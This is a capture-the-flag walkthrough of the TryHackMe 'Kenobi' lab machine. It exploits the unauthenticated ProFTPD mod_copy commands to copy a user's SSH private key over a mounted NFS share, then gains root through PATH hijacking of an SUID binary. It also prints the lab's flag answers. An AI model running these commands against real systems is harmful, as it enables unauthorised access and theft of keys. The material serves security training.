---
description: Walkthrough on exploiting a Linux machine
---

# Kenobi

{% embed url="https://tryhackme.com/room/kenobi" %}
https://tryhackme.com/room/kenobi
{% endembed %}

## Task 1 Deploy the vulnerable machine

#### **Scan the machine with nmap, how many ports are open?**

```bash
sudo nmap 10.10.253.108
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 18-07-46.png>)

{% hint style="success" %}
`7`
{% endhint %}

## Task 2 Enumerating Samba for shares

#### Using the nmap command above, how many shares have been found?

```bash
nmap -n -p 445 --script smb-enum-shares,smb-enum-users 10.10.253.108
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 18-37-28.png>)

{% hint style="success" %}
`3`
{% endhint %}

#### Once you're connected, list the files on the share. What is the file can you see?

```bash
smbclient //10.10.253.108/anonymous
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 18-20-02.png>)

{% hint style="success" %}
`log.txt`
{% endhint %}



#### Open the file on the share. There is a few interesting things found.

* Information generated for Kenobi when generating an SSH key for the user
* Information about the ProFTPD server.

#### **What port is FTP running on?**

```bash
smbget -R smb://10.10.253.108/anonymous
sed -n '23,33p' log.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 18-25-27.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-25 18-52-38.png>)

{% hint style="success" %}
`21`
{% endhint %}

#### What mount can we see?

```bash
sudo nmap -p 111 --script nfs-ls,nfs-statfs,nfs-showmount 10.10.253.108
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 18-56-47.png>)

{% hint style="success" %}
`/var`
{% endhint %}

## Task 3 Gain initial access with ProFtpd

#### Lets get the version of ProFtpd. What is the version?

```bash
nc -nv 10.10.253.108 21
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-04-59.png>)

{% hint style="success" %}
`1.3.5`
{% endhint %}

#### We can use searchsploit to find exploits for a particular software version.&#x20;

#### How many exploits are there for the ProFTPd running?

```bash
searchsploit proftpd 1.3.5
```

![](<../../.gitbook/assets/Screenshot from 2022-04-20 06-06-55.png>)

{% hint style="success" %}
`4`
{% endhint %}

#### You should have found an exploit from ProFtpd's [mod\_copy module](http://www.proftpd.org/docs/contrib/mod\_copy.html).&#x20;

#### The mod\_copy module implements **SITE CPFR** and **SITE CPTO** commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

#### We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.

```bash
sed -n '50,52p' log.txt
cat log.txt | head -21
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-16-29.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-17-51.png>)

#### We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

#### We knew that the /var directory was a mount we could see. So we've now moved Kenobi's private key to the /var/tmp directory.

```bash
nc -nv 10.10.253.108 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-26-42.png>)

#### Lets mount the /var/tmp directory to our machine. What is Kenobi's user flag?

```bash
sudo mkdir -p /mnt/kenobi
sudo mount -o tcp 10.10.253.108:/var /mnt/kenobi
cp /mnt/kenobi/tmp/id_rsa .
chmod 400 id_rsa
ssh -i id_rsa kenobi@10.10.253.108
cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-40-39.png>)

{% hint style="success" %}
`d0b0f3f53b6caa532a83915e19224899`
{% endhint %}

## Task 4 Privilege Escalation with Path Variable Manipulation

#### SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

#### What file looks particularly out of the ordinary?

```
wget http://10.9.101.193/suid3num.py
python suid3num.py
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-51-55.png>)

{% hint style="success" %}
`/usr/bin/menu`
{% endhint %}

#### **Run the binary, how many options appear?**

```
menu
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-50-29.png>)

{% hint style="success" %}
`3`
{% endhint %}

#### As this file runs as the root users privileges, we can manipulate our path gain a root shell.

#### Strings is a command on Linux that looks for human readable strings on a binary. This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

```
strings /usr/bin/menu | sed -n '23,25p'
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 20-08-58.png>)

#### We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /bin/sh, as well as this file being run as root it runs our shell as root!

#### **What is the root flag (/root/root.txt)?**

```
cp /bin/bash /tmp/ifconfig
chmod 777 /tmp/ifconfig
PATH=/tmp:$PATH menu
3
cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 20-03-29.png>)

{% hint style="success" %}
`177b3cd8562289f37382721c28381f02`
{% endhint %}
